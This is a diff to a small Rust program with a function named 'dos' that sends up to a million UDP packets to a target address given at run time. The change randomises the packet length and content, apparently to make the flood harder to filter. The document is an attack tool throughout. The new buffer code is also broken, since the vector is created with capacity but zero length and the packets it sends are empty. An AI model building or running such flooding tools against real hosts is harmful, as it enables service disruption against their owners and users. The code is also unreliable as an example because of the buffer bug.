@@ -1,5 +1,6 @@
 use std::env;
 use std::net::{UdpSocket, SocketAddr};
+use rand::Rng;
 
 
 fn dos(addr_string: String) -> std::io::Result<()> {
@@ -41,9 +42,16 @@ fn main() -> std::io::Result<()> {
 
     let addr: SocketAddr = addr_string.parse().unwrap();
 
-    let buf = [5; 999];
-
     for i in 0..1_000_000 {
+
+        let buf_len: usize = rand::thread_rng().gen_range(900..1100);
+
+        let mut buf: Vec<u8> = Vec::with_capacity(buf_len);
+
+        for i in 0..buf.len() {
+            buf[i] = rand::thread_rng().gen_range(33..=126);
+        }
+
         socket.send_to(&buf, &addr)?;
         std::thread::sleep(std::time::Duration::from_millis(1_000));
         println!("sent pktno={}", i);
